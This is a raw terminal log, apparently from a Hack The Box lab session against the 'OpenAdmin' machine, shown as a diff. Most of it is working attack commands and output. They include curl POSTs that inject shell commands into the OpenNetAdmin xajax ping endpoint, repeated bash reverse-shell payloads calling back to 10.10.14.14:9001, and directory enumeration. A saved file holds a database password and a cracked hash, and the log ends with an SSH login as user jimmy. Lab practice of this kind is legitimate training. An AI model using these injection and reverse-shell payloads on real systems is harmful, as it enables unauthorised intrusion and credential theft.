@@ -1,0 +1,533 @@
+┌─[root@parrot]─[~/hackthebox/openadmin]    
+└──╼ #ls                                    
+exploit.sh  nmap                            
+┌─[root@parrot]─[~/hackthebox/openadmin]    
+└──╼ #vi exploit.sh                         
+┌─[root@parrot]─[~/hackthebox/openadmin]    
+└──╼ #ls -la                                
+total 16                                    
+drwxr-xr-x  3 root root 4096 Jan 10 03:39 . 
+drwxr-xr-x 33 root root 4096 Jan  9 10:09 ..
+-rwxr-xr-x  1 root root  794 Jan 10 03:39 exploit.sh                                    
+drwxr-xr-x  2 root root 4096 Jan  8 21:46 nmap                                          
+┌─[root@parrot]─[~/hackthebox/openadmin]    
+└──╼ #./exploit.sh                          
+./exploit.sh: line 8: $'\r': command not found                                          
+./exploit.sh: line 16: $'\r': command not found                                         
+./exploit.sh: line 18: $'\r': command not found                                         
+./exploit.sh: line 24: syntax error: unexpected end of file                             
+┌─[✗]─[root@parrot]─[~/hackthebox/openadmin]
+└──╼ #echo -n "$"     
+$┌─[root@parrot]─[~/hackthebox/openadmin]   
+└──╼ #echo -n "$ ";read cmd                 
+$ gyan                
+┌─[root@parrot]─[~/hackthebox/openadmin]    
+└──╼ #$cmd            
+-bash: gyan: command not found              
+┌─[✗]─[root@parrot]─[~/hackthebox/openadmin]
+└──╼ #curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxa     
+> ┌─[root@parrot]─[~/hackthebox/openadmin]                                                │rgs[]=ip%3D%3E;echo \"BEGIN\";"uname -a";echo \"END\"&xajaxargs[]=ping" "${URL}" | sed                                        
+Usage: sed [OPTION]... {script-only-if-no-other-script} [input-file]...                 
+
+  -n, --quiet, --silent                     
+                 suppress automatic printing of pattern space                           
+      --debug         
+                 annotate program execution 
+  -e script, --expression=script            
+                 add the script to the commands to be executed                          
+  -f script-file, --file=script-file        
+                 add the contents of script-file to the commands to be executed         
+  --follow-symlinks   
+                 follow symlinks when processing in place                               
+  -i[SUFFIX], --in-place[=SUFFIX]           
+                 edit files in place (makes backup if SUFFIX supplied)                  
+  -l N, --line-length=N                     
+                 specify the desired line-wrap length for the `l' command               
+  --posix             
+                 disable all GNU extensions.                                            
+  -E, -r, --regexp-extended                 
+                 use extended regular expressions in the script                         
+                 (for portability use POSIX -E).                                        
+  -s, --separate      
+                 consider files as separate rather than as a single,                    
+                 continuous long stream.    
+      --sandbox       
+                 operate in sandbox mode (disable e/r/w commands).                      
+  -u, --unbuffered    
+                 load minimal amounts of data from the input files and flush            
+                 the output buffers more often                                          
+  -z, --null-data     
+                 separate lines by NUL characters                                       
+      --help     display this help and exit 
+      --version  output version information and exit                                    
+
+If no -e, --expression, -f, or --file option is given, then the first                   
+non-option argument is taken as the sed script to interpret.  All                       
+remaining arguments are names of input files; if no input files are                     
+specified, then the standard input is read. 
+
+GNU sed home page: <https://www.gnu.org/software/sed/>.                                 
+General help using GNU software: <https://www.gnu.org/gethelp/>.                        
+curl: option -a;echo "END"&xajaxargs[]=ping: is unknown                                 
+curl: try 'curl --help' or 'curl --manual' for more information                         
+┌─[✗]─[root@parrot]─[~/hackthebox/openadmin]
+└──╼ #└──╼ #ls -la                                                                            │-n -e '/BEGIN/,/END/ p' 
+-bash: └──╼: command not found              
+┌─[✗]─[root@parrot]─[~/hackthebox/openadmin]
+└──╼ #curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";"uname -a";echo \"END\"&xajaxargs[]=ping" "http://10.1                                         
+0.10.171/ona/" | sed -n -e '/BEGIN/,/END/ p'                                            
+curl: option -a;echo "END"&xajaxargs[]=ping: is unknown                                 
+curl: try 'curl --help' or 'curl --manual' for more information                         
+┌─[root@parrot]─[~/hackthebox/openadmin]    
+└──╼ #curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";"uname";echo \"END\"&xajaxargs[]=ping" "http://10.10.1                                         
+0.171/ona/" | sed -n -e '/BEGIN/,/END/ p'                                              
+                <pre style="padding: 4px;font-family: monospace;">BEGIN                 
+Linux                 
+END                   
+┌─[root@parrot]─[~/hackthebox/openadmin]    
+└──╼ #curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";"who";echo \"END\"&xajaxargs[]=ping" "http://10.10.10.                                         
+171/ona/" | sed -n -e '/BEGIN/,/END/ p'                                                 
+                <pre style="padding: 4px;font-family: monospace;">BEGIN                 
+END                   
+┌─[root@parrot]─[~/hackthebox/openadmin]    
+└──╼ #curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";"whoami";echo \"END\"&xajaxargs[]=ping" "http://10.10.                                         
+10.171/ona/" | sed -n -e '/BEGIN/,/END/ p'                                              
+                <pre style="padding: 4px;font-family: monospace;">BEGIN                 
+www-data              
+END                   
+┌─[root@parrot]─[~/hackthebox/openadmin]    
+└──╼ #curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";"which nc";echo \"END\"&xajaxargs[]=ping" "http://10.1                                         
+0.10.171/ona/" | sed -n -e '/BEGIN/,/END/ p'                                            
+┌─[root@parrot]─[~/hackthebox/openadmin]    
+└──╼ #curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";"which bash";echo \"END\"&xajaxargs[]=ping" "http://10                                         
+.10.10.171/ona/" | sed -n -e '/BEGIN/,/END/ p'                                          
+┌─[root@parrot]─[~/hackthebox/openadmin]    
+└──╼ #curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";"bash";echo \"END\"&xajaxargs[]=ping" "http://10.10.10                                         
+.171/ona/" | sed -n -e '/BEGIN/,/END/ p'                                                
+                <pre style="padding: 4px;font-family: monospace;">BEGIN                 
+END                   
+┌─[root@parrot]─[~/hackthebox/openadmin]    
+└──╼ #curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo "whoami"&xajaxargs[]=ping" "http://10.10.10.171/ona/"                                                    
+<?xml version="1.0" encoding="utf-8" ?><xjx><cmd n="js"><![CDATA[removeElement('tooltips_results');]]></cmd><cmd n="ce" t="window_container" p="tooltips_results"><![CDATA[div]]></cmd><cmd n="js"><![CDATA[initialize_window('tooltips_results');el('tooltips_results').style.display = 'none';el('tooltips_results').style.visibility = 'hidden';el('tooltips_results').onclick = function(ev) { focus_window(this.id); };]]></cmd><cmd n="as" t="tooltips_results" p="innerHTML"><![CDATA[                                             
+        <!-- This wrapper table is so that internal tables can be set to 100% width and they won't stretch the box too wide. -->      
+        <table id="tooltips_results_table" cellspacing="0" border="0" cellpadding="0"> 
+        <tr>          
+        <td>          
+
+            <!-- Window bar and close button -->                                        
+            <table id="tooltips_results_title_table" class="window_title" style="border-bottom: 1px solid #69A6DE;background-color: #69A6DE;" width="100%" cellspacing="0" border="0" cellpadding="0">                   
+            <tr>      
+
+                <td id="tooltips_results_title"                                         
+                    width="99%"             
+                    align="left"            
+                    nowrap="true"           
+                    onMouseDown="focus_window('tooltips_results'); dragStart(event, 'tooltips_results');" 
+                    style="cursor: move;    
+                           white-space: nowrap;                                         
+                           font-weight: bold;                                           
+                           text-align: left;                                            
+                           padding: 2px 4px;">Ping Results</td>                         
+
+                <td id="tooltips_results_title_r"                                       
+                    align="right"           
+                    nowrap="true"           
+                    style="color: #294157;  
+                           white-space: nowrap;                                         
+                           text-align: right;                                           
+                           padding: 2px 4px;"><span id="tooltips_results_title_help"></span>&nbsp;<a title="Close window" style="cursor: pointer;" onClick="removeElement('tooltips_results');"><img src="/ona/images/icon_close.gif" border="0" /></a></td>         
+
+            </tr>     
+            </table>  
+<!-- Module Output -->
+<table style="background-color: #F2F2F2; padding-left: 25px; padding-right: 25px;" width="100%" cellspacing="0" border="0" cellpadding="0">
+    <tr>              
+        <td align="left" class="padding">   
+            <br>      
+            <div style="border: solid 2px #000000; background-color: #FFFFFF; width: 650px; height: 350px; overflow: auto;resize: both;">  
+                <pre style="padding: 4px;font-family: monospace;">whoami                
+</pre>                
+            </div>    
+        </td>         
+    </tr>             
+</table>              
+
+<!-- Just a little padding -->              
+<table style="background-color: #F2F2F2; padding-left: 25px; padding-right: 25px;" width="100%" cellspacing="0" border="0" cellpadding="0">
+    <tr>              
+        <td id="tooltips_extras" align="center" class="padding"><input type="button" class="edit" name="Close" value="Close" onclick="removeElement('tooltips_results');"><br></td>                                      
+    </tr>             
+</table>              
+        </td>         
+        </tr>         
+└──╼ #curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";;echo \"END\"&xajaxargs[]=ping" "http://10.10.10.171/o                                         
+na/" | url --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";;echo \"END\"&xajaxargs[]=ping" "http://10.10.10.171/o                                         
+>                                           
+> ^C                                        
+┌─[✗]─[root@parrot]─[~/hackthebox/openadmin]
+└──╼ #curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";"bash -i >& /dev/tcp/10.10.14.14/9001 0>&1";echo \"END                                         
+\"&xajaxargs[]=ping" "http://10.10.10.171/ona/" | sed -n -e '/BEGIN/,/END/ p'                                                                                                                                            
+┌─[root@parrot]─[~/hackthebox/openadmin]    
+└──╼ #ping 10.10.10.171                     
+PING 10.10.10.171 (10.10.10.171) 56(84) bytes of data.                                  
+64 bytes from 10.10.10.171: icmp_seq=1 ttl=63 time=214 ms                               
+64 bytes from 10.10.10.171: icmp_seq=2 ttl=63 time=468 ms                               
+64 bytes from 10.10.10.171: icmp_seq=3 ttl=63 time=490 ms                               
+^C                                          
+--- 10.10.10.171 ping statistics ---        
+3 packets transmitted, 3 received, 0% packet loss, time 2003ms                          
+rtt min/avg/max/mdev = 213.602/390.811/490.498/125.632 ms                               
+┌─[root@parrot]─[~/hackthebox/openadmin]    
+└──╼ #curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";"bash -i >& /dev/tcp/10.10.14.14/9001 0>&1";echo \"END                                         
+\"&xajaxargs[]=ping" "http://10.10.10.171/ona/" | sed -n -e '/BEGIN/,/END/ p'                                                                                                                                            
+┌─[root@parrot]─[~/hackthebox/openadmin]    
+└──╼ #curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";"bash -i >& /dev/tcp/10.10.14.14/9001 0>&1";echo \"END\"&xajaxargs[]=" "http://10.10.10.171/ona/" | sed -n -e '/BEGIN/,/END/ p'                                                                                                                                              
+┌─[root@parrot]─[~/hackthebox/openadmin]    
+└──╼ #curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";"bash -i >& /dev/tcp/10.10.14.14/9001 0>&1";echo \"END\" "http://10.10.10.171/ona/" | sed -n -e '/BEGIN/,/END/ p'                                                                                                                                                            
+>                                           
+> exit                                      
+> exit                                      
+> exit                                      
+> ^C                                        
+┌─[✗]─[root@parrot]─[~/hackthebox/openadmin]
+└──╼ #curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";"bash -i >& /dev/tcp/10.10.14.14/9001 0>&1";echo \"END\"&xajaxargs[]=ping" "http://10.10.10.171/ona/" | sed -n -e '/BEGIN/,/END/ p'                                                                                                                                          
+-bash: connect: Connection refused          
+-bash: /dev/tcp/10.10.14.14/9001: Connection refused                                    
+┌─[root@parrot]─[~/hackthebox/openadmin]    
+└──╼ #curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo "bash -i >& /dev/tcp/10.10.14.14/9001 0>&1"&xajaxargs[]=ping" "h                                         
+ttp://10.10.10.171/ona/"                                                                                                                                                                                                 
+┌─[✗]─[root@parrot]─[~/hackthebox/openadmin]
+└──╼ #curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;"bash -i >& /dev/tcp/10.10.14.14/9001 0>&1"&xajaxargs[]=ping" "http:/                                         
+/10.10.10.171/ona/"                                                                                                                                                                                                      
+┌─[✗]─[root@parrot]─[~/hackthebox/openadmin]
+└──╼ #curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;"bash -i >& /dev/tcp/10.10.14.14/9001 0>&1"&xajaxargs[]=echo" "http:/                                         
+/10.10.10.171/ona/"                                                                                                                                                                                                      
+┌─[✗]─[root@parrot]─[~/hackthebox/openadmin]
+└──╼ #curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;'bash -i >& /dev/tcp/10.10.14.14/9001 0>&1'&xajaxargs[]=uname" "http:                                         
+//10.10.10.171/ona/"                                                                                                                                                                                                     
+<?xml version="1.0" encoding="utf-8" ?><xjx></xjx>┌─[root@parrot]─[~/hackthebox/openadmin] 
+└──╼ #curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;'bash -i >& /dev/tcp/10.10.14.14/9001 0>&1'&xajaxargs[]=ping" "http:/                                         
+/10.10.10.171/ona/"                                                                                                                                                                                                      
+<?xml version="1.0" encoding="utf-8" ?><xjx><cmd n="js"><![CDATA[removeElement('tooltips_results');]]></cmd><cmd n="ce" t="window_container" p="tooltips_results"><![CDATA[div]]></cmd><cmd n="js"><![CDATA[initialize_window('tooltips_results');el('tooltips_results').style.display = 'none';el('tooltips_results').style.visibility = 'hidden';el('tooltips_results').onclick = function(ev) { focus_window(this.id); };]]></cmd><cmd n="as" t="tooltips_results" p="innerHTML"><![CDATA[                                             
+        <!-- This wrapper table is so that internal tables can be set to 100% width and they won't stretch the box too wide. -->      
+        <table id="tooltips_results_table" cellspacing="0" border="0" cellpadding="0"> 
+        <tr>                                
+        <td>                                
+
+            <!-- Window bar and close button -->                                        
+            <table id="tooltips_results_title_table" class="window_title" style="border-bottom: 1px solid #69A6DE;background-color: #69A6DE;" width="100%" cellspacing="0" border="0" cellpadding="0">                   
+            <tr>                            
+
+                <td id="tooltips_results_title"                                         
+                    width="99%"             
+                    align="left"            
+                    nowrap="true"           
+                    onMouseDown="focus_window('tooltips_results'); dragStart(event, 'tooltips_results');" 
+                    style="cursor: move;    
+                           white-space: nowrap;                                         
+                           font-weight: bold;                                           
+                           text-align: left;                                            
+                           padding: 2px 4px;">Ping Results</td>                         
+
+                <td id="tooltips_results_title_r"                                       
+                    align="right"           
+                    nowrap="true"           
+                    style="color: #294157;  
+                           white-space: nowrap;                                         
+                           text-align: right;                                           
+                           padding: 2px 4px;"><span id="tooltips_results_title_help"></span>&nbsp;<a title="Close window" style="cursor: pointer;" onClick="removeElement('tooltips_results');"><img src="/ona/images/icon_close.gif" border="0" /></a></td>         
+
+            </tr>                           
+            </table>                        
+<!-- Module Output -->                      
+<table style="background-color: #F2F2F2; padding-left: 25px; padding-right: 25px;" width="100%" cellspacing="0" border="0" cellpadding="0">
+    <tr>                                    
+        <td align="left" class="padding">   
+            <br>                            
+            <div style="border: solid 2px #000000; background-color: #FFFFFF; width: 650px; height: 350px; overflow: auto;resize: both;">  
+                <pre style="padding: 4px;font-family: monospace;"></pre>                
+            </div>                          
+        </td>                               
+    </tr>                                   
+</table>                                    
+
+<!-- Just a little padding -->              
+<table style="background-color: #F2F2F2; padding-left: 25px; padding-right: 25px;" width="100%" cellspacing="0" border="0" cellpadding="0">
+    <tr>                                    
+        <td id="tooltips_extras" align="center" class="padding"><input type="button" class="edit" name="Close" value="Close" onclick="removeElement('tooltips_results');"><br></td>                                      
+    </tr>                                   
+</table>                                    
+        </td>                               
+        </tr>                               
+        </table>]]></cmd><cmd n="js"><![CDATA[toggle_window('tooltips_results');]]></cmd></xjx>┌─[root@parrot]─[~/hackthebox/openadmin]    
+└──╼ #curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo 'bash -i >& /dev/tcp/10.10.14.14/9001 0>&1'&xajaxargs[]=ping" "h                                         
+ttp://10.10.10.171/ona/"                    
+<?xml version="1.0" encoding="utf-8" ?><xjx><cmd n="js"><![CDATA[removeElement('tooltips_results');]]></cmd><cmd n="ce" t="window_container" p="tooltips_results"><![CDATA[div]]></cmd><cmd n="js"><![CDATA[initialize_window('tooltips_results');el('tooltips_results').style.display = 'none';el('tooltips_results').style.visibility = 'hidden';el('tooltips_results').onclick = function(ev) { focus_window(this.id); };]]></cmd><cmd n="as" t="tooltips_results" p="innerHTML"><![CDATA[                                             
+        <!-- This wrapper table is so that internal tables can be set to 100% width and they won't stretch the box too wide. -->      
+        <table id="tooltips_results_table" cellspacing="0" border="0" cellpadding="0"> 
+        <tr>                                
+        <td>                                
+
+            <!-- Window bar and close button -->                                        
+            <table id="tooltips_results_title_table" class="window_title" style="border-bottom: 1px solid #69A6DE;background-color: #69A6DE;" width="100%" cellspacing="0" border="0" cellpadding="0">                   
+            <tr>                            
+
+                <td id="tooltips_results_title"                                         
+                    width="99%"             
+                    align="left"            
+                    nowrap="true"           
+                    onMouseDown="focus_window('tooltips_results'); dragStart(event, 'tooltips_results');" 
+                    style="cursor: move;    
+                           white-space: nowrap;                                         
+                           font-weight: bold;                                           
+                           text-align: left;                                            
+                           padding: 2px 4px;">Ping Results</td>                         
+
+                <td id="tooltips_results_title_r"                                       
+                    align="right"           
+                    nowrap="true"           
+                    style="color: #294157;  
+                           white-space: nowrap;                                         
+                           text-align: right;                                           
+                           padding: 2px 4px;"><span id="tooltips_results_title_help"></span>&nbsp;<a title="Close window" style="cursor: pointer;" onClick="removeElement('tooltips_results');"><img src="/ona/images/icon_close.gif" border="0" /></a></td>         
+
+            </tr>                           
+            </table>                        
+<!-- Module Output -->                      
+<table style="background-color: #F2F2F2; padding-left: 25px; padding-right: 25px;" width="100%" cellspacing="0" border="0" cellpadding="0">
+    <tr>                                    
+        <td align="left" class="padding">   
+            <br>                            
+            <div style="border: solid 2px #000000; background-color: #FFFFFF; width: 650px; height: 350px; overflow: auto;resize: both;">  
+                <pre style="padding: 4px;font-family: monospace;"></pre>                
+            </div>                          
+        </td>                               
+    </tr>                                   
+</table>                                    
+
+<!-- Just a little padding -->              
+<table style="background-color: #F2F2F2; padding-left: 25px; padding-right: 25px;" width="100%" cellspacing="0" border="0" cellpadding="0">
+    <tr>                                    
+        <td id="tooltips_extras" align="center" class="padding"><input type="button" class="edit" name="Close" value="Close" onclick="removeElement('tooltips_results');"><br></td>                                      
+    </tr>                                   
+</table>                                    
+        </td>                               
+        </tr>                               
+        </table>]]></cmd><cmd n="js"><![CDATA[toggle_window('tooltips_results');]]></cmd></xjx>┌─[root@parrot]─[~/hackthebox/openadmin]    
+└──╼ #curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";\"bash -i >& /dev/tcp/10.10.14.14/9001 0>&1\";echo \"E                                         
+ND\"&xajaxargs[]=ping" "http://10.10.10.171/ona/" | sed -n -e '/BEGIN/,/END/ p'                                                                                                                                          
+┌─[root@parrot]─[~/hackthebox/openadmin]    
+└──╼ #curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";'bash -i >& /dev/tcp/10.10.14.14/9001 0>&1';echo \"END                                         
+\"&xajaxargs[]=ping" "http://10.10.10.171/ona/" | sed -n -e '/BEGIN/,/END/ p'                                                                                                                                            
+┌─[root@parrot]─[~/hackthebox/openadmin]    
+└──╼ #curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";echo 'bash -i >& /dev/tcp/10.10.14.14/9001 0>&1';echo                                          
+\"END\"&xajaxargs[]=ping" "http://10.10.10.171/ona/" | sed -n -e '/BEGIN/,/END/ p'                                                                                                                                       
+┌─[root@parrot]─[~/hackthebox/openadmin]    
+└──╼ #curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";echo uname;echo \"END\"&xajaxargs[]=ping" "http://10.1                                         
+0.10.171/ona/" | sed -n -e '/BEGIN/,/END/ p'                                                                                                                                                                             
+                <pre style="padding: 4px;font-family: monospace;">BEGIN                 
+uname                                       
+END                                         
+┌─[root@parrot]─[~/hackthebox/openadmin]    
+└──╼ #curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";echo 'uname';echo \"END\"&xajaxargs[]=ping" "http://10                                         
+.10.10.171/ona/" | sed -n -e '/BEGIN/,/END/ p'                                                                                                                                                                           
+                <pre style="padding: 4px;font-family: monospace;">BEGIN                 
+uname                                       
+END                                         
+┌─[root@parrot]─[~/hackthebox/openadmin]    
+└──╼ #curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";uname;echo \"END\"&xajaxargs[]=ping" "http://10.10.10.                                         
+171/ona/" | sed -n -e '/BEGIN/,/END/ p'                                                                                                                                                                                  
+                <pre style="padding: 4px;font-family: monospace;">BEGIN                 
+Linux                                       
+END                                         
+┌─[root@parrot]─[~/hackthebox/openadmin]    
+└──╼ #curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";whoami;echo \"END\"&xajaxargs[]=ping" "http://10.10.10                                         
+.171/ona/" | sed -n -e '/BEGIN/,/END/ p'                                                                                                                                                                                 
+                <pre style="padding: 4px;font-family: monospace;">BEGIN                 
+www-data                                    
+END                                         
+┌─[root@parrot]─[~/hackthebox/openadmin]    
+└──╼ #curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";bash -i >& /dev/tcp/10.10.14.14/9001 0>&1;echo \"END\"                                         
+&xajaxargs[]=ping" "http://10.10.10.171/ona/" | sed -n -e '/BEGIN/,/END/ p'                                                                                                                                              
+┌─[root@parrot]─[~/hackthebox/openadmin]    
+└──╼ #curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";$PATH;echo \"END\"&xajaxargs[]=ping" "http://10.10.10.                                         
+171/ona/" | sed -n -e '/BEGIN/,/END/ p'                                                                                                                                                                                  
+                <pre style="padding: 4px;font-family: monospace;">BEGIN                 
+END                                         
+┌─[root@parrot]─[~/hackthebox/openadmin]    
+└──╼ #curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";whoami;echo \"END\"&xajaxargs[]=ping" "http://10.10.10                                         
+.171/ona/" | sed -n -e '/BEGIN/,/END/ p'                                                                                                                                                                                 
+                <pre style="padding: 4px;font-family: monospace;">BEGIN                 
+www-data                                    
+END                                         
+┌─[root@parrot]─[~/hackthebox/openadmin]    
+└──╼ #curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";ls;echo \"END\"&xajaxargs[]=ping" "http://10.10.10.171                                         
+/ona/" | sed -n -e '/BEGIN/,/END/ p'                                                                                                                                                                                     
+                <pre style="padding: 4px;font-family: monospace;">BEGIN                 
+config                                      
+config_dnld.php                             
+dcm.php                                     
+images                                      
+include                                     
+index.php                                   
+local                                       
+login.php                                   
+logout.php                                  
+modules                                     
+plugins                                     
+winc                                        
+workspace_plugins                           
+END                                         
+┌─[root@parrot]─[~/hackthebox/openadmin]    
+└──╼ #curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";ls /home/;echo \"END\"&xajaxargs[]=ping" "http://10.10                                         
+.10.171/ona/" | sed -n -e '/BEGIN/,/END/ p'                                                                                                                                                                              
+                <pre style="padding: 4px;font-family: monospace;">BEGIN                 
+jimmy                                       
+joanna                                      
+END                                         
+┌─[root@parrot]─[~/hackthebox/openadmin]    
+└──╼ #curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";ls /home/jimmy;echo \"END\"&xajaxargs[]=ping" "http://                                         
+10.10.10.171/ona/" | sed -n -e '/BEGIN/,/END/ p'                                                                                                                                                                         
+                <pre style="padding: 4px;font-family: monospace;">BEGIN                 
+END                                         
+┌─[root@parrot]─[~/hackthebox/openadmin]    
+└──╼ #curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";ls /home/joanna;echo \"END\"&xajaxargs[]=ping" "http:/                                         
+/10.10.10.171/ona/" | sed -n -e '/BEGIN/,/END/ p'                                                                                                                                                                        
+                <pre style="padding: 4px;font-family: monospace;">BEGIN                 
+END                                         
+┌─[root@parrot]─[~/hackthebox/openadmin]    
+└──╼ #curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";ls /root/;echo \"END\"&xajaxargs[]=ping" "http://10.10                                         
+.10.171/ona/" | sed -n -e '/BEGIN/,/END/ p'                                                                                                                                                                              
+                <pre style="padding: 4px;font-family: monospace;">BEGIN                 
+END                                         
+┌─[root@parrot]─[~/hackthebox/openadmin]    
+└──╼ #curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";ls /var/www/html/;echo \"END\"&xajaxargs[]=ping" "http                                         
+://10.10.10.171/ona/" | sed -n -e '/BEGIN/,/END/ p'                                                                                                                                                                      
+                <pre style="padding: 4px;font-family: monospace;">BEGIN                 
+artwork                                     
+index.html                                  
+marga                                       
+music                                       
+ona                                         
+sierra                                      
+END                                         
+┌─[root@parrot]─[~/hackthebox/openadmin]    
+└──╼ #ls                                                                                                                                                                                                                 
+exploit.sh  l.sh  nmap  reverse.sh  shell.sh  www                                          
+┌─[root@parrot]─[~/hackthebox/openadmin]     
+└──╼ #cd www/                                
+┌─[root@parrot]─[~/hackthebox/openadmin/www] 
+└──╼ #ls                                     
+441038db16484658bc35923b9114f834b393bb  LinEnum.sh  reverse.php                            
+┌─[root@parrot]─[~/hackthebox/openadmin/www] 
+└──╼ #python -m SimpleHTTPServer             
+Traceback (most recent call last):           
+  File "/usr/lib/python2.7/runpy.py", line 174, in _run_module_as_main                     
+    "__main__", fname, loader, pkg_name)     
+  File "/usr/lib/python2.7/runpy.py", line 72, in _run_code                                
+    exec code in run_globals                 
+  File "/usr/lib/python2.7/SimpleHTTPServer.py", line 235, in <module>                     
+    test()                                   
+  File "/usr/lib/python2.7/SimpleHTTPServer.py", line 231, in test                         
+    BaseHTTPServer.test(HandlerClass, ServerClass)                                         
+  File "/usr/lib/python2.7/BaseHTTPServer.py", line 606, in test                           
+    httpd = ServerClass(server_address, HandlerClass)                                      
+  File "/usr/lib/python2.7/SocketServer.py", line 420, in __init__                         
+    self.server_bind()                       
+  File "/usr/lib/python2.7/BaseHTTPServer.py", line 108, in server_bind                    
+    SocketServer.TCPServer.server_bind(self) 
+  File "/usr/lib/python2.7/SocketServer.py", line 434, in server_bind                      
+    self.socket.bind(self.server_address)    
+  File "/usr/lib/python2.7/socket.py", line 228, in meth                                   
+    return getattr(self._sock,name)(*args)   
+socket.error: [Errno 98] Address already in use                                            
+┌─[✗]─[root@parrot]─[~/hackthebox/openadmin/www]                                           
+└──╼ #cd ..                                  
+┌─[root@parrot]─[~/hackthebox/openadmin]     
+└──╼ #vi creds                               
+┌─[root@parrot]─[~/hackthebox/openadmin]     
+└──╼ #cat creds                              
+sql db creds                                 
+        ona_sys                              
+        n1nj4W4rri0R!                        
+
+
+00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1:Revealed  
+┌─[root@parrot]─[~/hackthebox/openadmin]     
+└──╼ #ssh jimmy@10.10.10.171            
+jimmy@10.10.10.171's password:          
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)              
+
+ * Documentation:  https://help.ubuntu.com                                      
+ * Management:     https://landscape.canonical.com                              
+ * Support:        https://ubuntu.com/advantage                                 
+
+  System information as of Sat Jan 11 01:50:00 UTC 2020                         
+
+  System load:  0.02              Processes:             133                    
+  Usage of /:   49.4% of 7.81GB   Users logged in:       1                      
+  Memory usage: 32%               IP address for ens160: 10.10.10.171           
+  Swap usage:   0%  
+
+
